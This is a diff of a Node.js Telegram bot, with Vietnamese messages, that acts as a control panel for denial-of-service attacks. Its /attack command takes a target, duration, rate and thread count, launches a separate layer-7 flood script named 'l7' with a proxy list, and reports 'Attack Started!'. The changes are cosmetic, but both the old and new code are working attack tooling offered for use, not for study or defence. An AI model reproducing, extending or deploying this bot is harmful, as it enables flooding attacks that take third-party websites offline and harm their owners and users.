@@ -9,66 +9,57 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-  res.send('Bot đang hoạt động!');
+  res.send('Bot hoạt động');
 });
 
 app.listen(PORT, () => {
-  console.log(`Server chạy tại cổng ${PORT}`);
+  console.log(`Server chạy cổng ${PORT}`);
 });
 
 bot.on('message', (msg) => {
-  console.log(`Nhận tin nhắn: ${msg.text} từ chat ID: ${msg.chat.id}`);
+  console.log(`Nhận: ${msg.text} từ chat ${msg.chat.id}`);
 });
 
 bot.onText(/\/start/, (msg) => {
-  const chatId = msg.chat.id;
-  bot.sendMessage(chatId, 'Bot đã khởi động! Sử dụng /attack [target] [time] [rate] [thread] để bắt đầu.');
+  bot.sendMessage(msg.chat.id, JSON.stringify({ message: "Bot khởi động. Dùng /attack [target] [time] [rate] [thread]" }, null, 2), { parse_mode: 'Markdown' });
 });
 
-bot.onText(/^\/attack (.+)/, (msg, match) => {
+bot.onText(/^\/attack\s+(.+)/, (msg, match) => {
   const chatId = msg.chat.id;
-  const args = match[1].trim().split(' ');
+  const args = match[1].split(/\s+/).filter(arg => arg);
 
   if (args.length !== 4) {
-    bot.sendMessage(chatId, '🚫 Cú pháp: /attack [target] [time] [rate] [thread]\nVí dụ: /attack example.com 60 100 10');
+    bot.sendMessage(chatId, JSON.stringify({ error: "/attack [target] [time] [rate] [thread] ✅" }, null, 2), { parse_mode: 'Markdown' });
     return;
   }
 
   const [target, time, rate, thread] = args;
 
   if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
-    bot.sendMessage(chatId, '🚫 Tham số không hợp lệ. Time, rate, thread phải là số.');
+    bot.sendMessage(chatId, JSON.stringify({ error: "🚫" }, null, 2), { parse_mode: 'Markdown' });
     return;
   }
 
   try {
     const command = spawn('node', ['l7', target, time, rate, thread, 'proxy.txt']);
 
-    const info = {
-      target,
-      time: `${time}s`,
-      rate,
-      thread,
-      proxy: 'proxy.txt'
-    };
+    const info = { target, time: `${time}s`, rate, thread, proxy: 'proxy.txt' };
+    bot.sendMessage(chatId, JSON.stringify({ message: "📌 Attack Started!", info }, null, 2), { parse_mode: 'Markdown' });
 
-    const message = `✅ Attack Started!\n➖➖➖➖➖➖➖➖➖➖\n\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``;
-    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-
-    console.log(`[ATTACK] Target: ${target} | Time: ${time}s | Rate: ${rate} | Thread: ${thread}`);
+    console.log(`[ATTACK] ${target} | ${time}s | ${rate} | ${thread}`);
 
     command.on('error', (error) => {
       console.error(`Lỗi spawn: ${error.message}`);
-      bot.sendMessage(chatId, `❌ Lỗi: ${error.message}`);
+      bot.sendMessage(chatId, JSON.stringify({ error: `🚫 Lỗi: ${error.message}` }, null, 2), { parse_mode: 'Markdown' });
     });
 
     command.on('close', (code) => {
-      console.log(`Lệnh hoàn thành với mã: ${code}`);
-      bot.sendMessage(chatId, `🚫 Lệnh hoàn thành với mã: ${code}`);
+      console.log(`Hoàn thành mã: ${code}`);
+      bot.sendMessage(chatId, JSON.stringify({ message: `ℹ️ Hoàn thành với mã: ${code}` }, null, 2), { parse_mode: 'Markdown' });
     });
   } catch (error) {
-    console.error(`Lỗi khi thực thi: ${error.message}`);
-    bot.sendMessage(chatId, `🚫 Lỗi: ${error.message}`);
+    console.error(`Lỗi thực thi: ${error.message}`);
+    bot.sendMessage(chatId, JSON.stringify({ error: `🚫 Lỗi: ${error.message}` }, null, 2), { parse_mode: 'Markdown' });
   }
 });
 
